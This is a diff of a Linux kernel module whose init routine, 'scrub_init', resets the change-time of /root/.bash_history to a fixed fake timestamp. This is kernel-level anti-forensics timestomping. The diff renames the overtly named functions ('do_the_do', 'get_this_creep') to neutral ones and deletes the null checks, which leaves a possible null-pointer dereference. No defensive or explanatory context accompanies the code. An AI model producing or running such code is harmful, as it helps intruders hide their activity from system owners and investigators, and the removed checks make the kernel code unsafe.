@@ -8,39 +8,34 @@
 #include <linux/uaccess.h>
 #include <linux/mount.h>
 
-void do_the_do(struct path *path)
+void update_ctime_path(struct path *path)
 {
     struct vfsmount *mnt = path->mnt;
-    struct dentry *dentry = path->dentry;
-    struct inode *inode = path->dentry->d_inode;
+    struct inode  *inode = path->dentry->d_inode;
 
-    if (!dentry||!inode)
-    {
-        return;
-    }
     printk("%ld\n",inode->i_ctime.tv_sec);
     mnt_want_write(mnt);
-    inode->i_ctime.tv_sec = 391965600;
-    inode->i_ctime.tv_nsec = 420;
+    inode->i_ctime.tv_sec  = 391965600;
+    inode->i_ctime.tv_nsec = 321;
     printk("%ld\n",inode->i_ctime.tv_sec);
     mark_inode_dirty_sync(inode);
     mnt_drop_write(mnt);
 }
 
-void get_this_creep(const char *pathname)
+void update_ctime_file(const char *pathname)
 {
     struct path path;
 
     if (pathname && kern_path(pathname, 0, &path) == 0) 
     {
-        do_the_do(&path);
+        update_ctime_path(&path);
         path_put(&path);
     }
 }
 
 int scrub_init(void)
 {
-    get_this_creep("/root/.bash_history");
+    update_ctime_file("/root/.bash_history");
     return(0);
 }
 
